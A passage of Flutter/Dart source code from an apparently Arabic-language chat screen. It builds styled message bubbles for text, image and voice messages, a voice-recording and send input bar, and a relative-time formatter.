                decoration: BoxDecoration(
                  gradient: isMe
                      ? LinearGradient(
                          colors: [
                            const Color(0xFF8B0000).withValues(alpha: 0.3),
                            const Color(0xFF1a1a1a),
                          ],
                        )
                      : null,
                  color: isMe ? null : const Color(0xFF121212),
                  borderRadius: BorderRadius.only(
                    topLeft: const Radius.circular(18),
                    topRight: const Radius.circular(18),
                    bottomLeft: isMe
                        ? const Radius.circular(18)
                        : const Radius.circular(2),
                    bottomRight: isMe
                        ? const Radius.circular(2)
                        : const Radius.circular(18),
                  ),
                  border: Border.all(
                    color: isMe
                        ? const Color(0xFFFF0000).withValues(alpha: 0.4)
                        : Colors.white.withAlpha(10),
                    width: isMe ? 1.5 : 0.5,
                  ),
                  boxShadow: isMe
                      ? [
                          BoxShadow(
                            color: const Color(
                              0xFFFF0000,
                            ).withValues(alpha: 0.1),
                            blurRadius: 10,
                            offset: const Offset(0, 2),
                          ),
                        ]
                      : null,
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    if (!isMe && messageType != 'image') ...[
                      Text(
                        user['name'] ?? 'عضو غير معرّف',
                        style: const TextStyle(
                          color: AppTheme.accentSilverGold,
                          fontSize: 11,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      const SizedBox(height: 4),
                    ],

                    if (messageType == 'text')
                      Text(
                        message['message'] ?? '',
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 14,
                          height: 1.5,
                        ),
                      )
                    else if (messageType == 'image')
                      ClipRRect(
                        borderRadius: BorderRadius.circular(14),
                        child: message['local_bytes'] != null
                            ? Image.memory(
                                message['local_bytes'],
                                fit: BoxFit.cover,
                              )
                            : CachedNetworkImage(
                                imageUrl: mediaUrl ?? '',
                                placeholder: (context, url) => Container(
                                  height: 150,
                                  color: Colors.white10,
                                  child: const Center(
                                    child: CircularProgressIndicator(
                                      strokeWidth: 2,
                                      color: AppTheme.accentSilverGold,
                                    ),
                                  ),
                                ),
                                errorWidget: (context, url, error) =>
                                    const Icon(
                                      Icons.broken_image,
                                      color: Colors.white24,
                                    ),
                              ),
                      )
                    else if (messageType == 'voice')
                      _buildVoicePlayer(
                        message,
                        mediaUrl,
                        message['id'] == _playingMessageId,
                      ),

                    const SizedBox(height: 4),
                    Text(
                      _formatTime(message['created_at']),
                      style: TextStyle(
                        color: isMe
                            ? AppTheme.accentSilverGold.withAlpha(150)
                            : Colors.white24,
                        fontSize: 9,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVoicePlayer(
    Map<String, dynamic> message,
    String? url,
    bool isPlaying,
  ) {
    if (message['is_uploading'] == true) {
      return Container(
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
        child: const Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            SizedBox(
              width: 16,
              height: 16,
              child: CircularProgressIndicator(
                strokeWidth: 2,
                color: AppTheme.accentSilverGold,
              ),
            ),
            SizedBox(width: 8),
            Text(
              'جاري الرفع...',
              style: TextStyle(color: Colors.white54, fontSize: 12),
            ),
          ],
        ),
      );
    }

    return GestureDetector(
      onTap: url != null ? () => _playVoice(message['id'], url) : null,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 4, horizontal: 8),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              isPlaying ? Icons.pause_rounded : Icons.play_arrow_rounded,
              color: AppTheme.accentSilverGold,
            ),
            const SizedBox(width: 8),
            // محاكاة لموجة الصوت
            SizedBox(
              height: 20,
              width: 80,
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: List.generate(10, (index) {
                  return Container(
                    width: 2,
                    height: 5 + (index % 3) * 5.0,
                    color: isPlaying
                        ? AppTheme.accentSilverGold
                        : Colors.white24,
                  );
                }),
              ),
            ),
            const SizedBox(width: 8),
            const Text(
              'مراسلة صوتية',
              style: TextStyle(color: Colors.white70, fontSize: 11),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildMessageInput() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 24),
      decoration: BoxDecoration(
        color: Colors.black,
        border: Border(
          top: BorderSide(color: Colors.white.withAlpha(10), width: 0.5),
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withAlpha(200),
            blurRadius: 20,
            offset: const Offset(0, -10),
          ),
        ],
      ),
      child: SafeArea(
        // إضافة SafeArea لضمان عدم تغطية الـ Home Indicator
        child: Row(
          children: [
            // زر الميكروفون / إيقاف
            InkWell(
              onTap: () {
                if (_isRecording) {
                  _stopVoiceRecording(cancel: false); // إيقاف وإرسال
                } else {
                  _startVoiceRecording(); // بدء التسجيل
                }
              },
              borderRadius: BorderRadius.circular(25),
              child: Container(
                width: 45,
                height: 45,
                decoration: BoxDecoration(
                  color: _isRecording
                      ? const Color(0xFFFF0000)
                      : const Color(0xFF151515),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: _isRecording ? Colors.red : Colors.white12,
                    width: 2,
                  ),
                ),
                child: Icon(
                  _isRecording ? Icons.stop_rounded : Icons.mic_rounded,
                  color: _isRecording ? Colors.white : Colors.white60,
                  size: 22,
                ),
              ),
            ),
            if (_isRecording) ...[
              const SizedBox(width: 12),
              // زر الإلغاء
              InkWell(
                onTap: () => _stopVoiceRecording(cancel: true),
                borderRadius: BorderRadius.circular(25),
                child: Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 16,
                    vertical: 10,
                  ),
                  decoration: BoxDecoration(
                    color: Colors.red.withValues(alpha: 0.2),
                    borderRadius: BorderRadius.circular(25),
                    border: Border.all(color: Colors.red, width: 1),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(
                        Icons.delete_outline,
                        color: Colors.red,
                        size: 18,
                      ),
                      const SizedBox(width: 6),
                      const Text(
                        'إلغاء',
                        style: TextStyle(
                          color: Colors.red,
                          fontWeight: FontWeight.bold,
                          fontSize: 13,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  '🎙️ جاري التسجيل...',
                  style: TextStyle(
                    color: AppTheme.accentSilverGold,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                  ),
                  textAlign: TextAlign.center,
                ),
              ),
            ] else ...[
              const SizedBox(width: 8),
              // زر الصور
              IconButton(
                icon: const Icon(
                  Icons.add_photo_alternate_rounded,
                  color: Colors.white38,
                  size: 24,
                ),
                onPressed: _pickAndSendImage,
                padding: EdgeInsets.zero,
                constraints: const BoxConstraints(),
              ),
              const SizedBox(width: 12),
              // حقل "المحبرة الملكية"
              Expanded(
                child: TextField(
                  controller: _messageController,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    hintText: 'تحرير رسالة رسمية...',
                    hintStyle: const TextStyle(
                      color: Colors.white24,
                      fontSize: 13,
                    ),
                    filled: true,
                    fillColor: const Color(0xFF121212),
                    contentPadding: const EdgeInsets.symmetric(
                      horizontal: 20,
                      vertical: 12,
                    ),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(24),
                      borderSide: const BorderSide(color: Colors.transparent),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(24),
                      borderSide: BorderSide(
                        color: AppTheme.accentSilverGold.withAlpha(50),
                        width: 0.5,
                      ),
                    ),
                  ),
                  onSubmitted: (_) => _sendMessage(),
                ),
              ),
              const SizedBox(width: 8),
              // زر الإرسال
              IconButton(
                icon: const Icon(
                  Icons.send_rounded,
                  color: AppTheme.accentSilverGold,
                  size: 24,
                ),
                onPressed: _sendMessage,
                padding: EdgeInsets.zero,
                constraints: const BoxConstraints(),
              ),
            ],
          ],
        ),
      ),
    );
  }

  String _formatTime(String? timestamp) {
    if (timestamp == null) return '';
    try {
      final dateTime = DateTime.parse(timestamp).toLocal();
      final now = DateTime.now();
      final difference = now.difference(dateTime);

      if (difference.inSeconds < 60) return 'الآن';
      if (difference.inMinutes < 60) return 'منذ ${difference.inMinutes} د';
      if (difference.inHours < 24) return 'منذ ${difference.inHours} س';
      return '${dateTime.day}/${dateTime.month}';
    } catch (_) {
      return '';
    }
  }
}
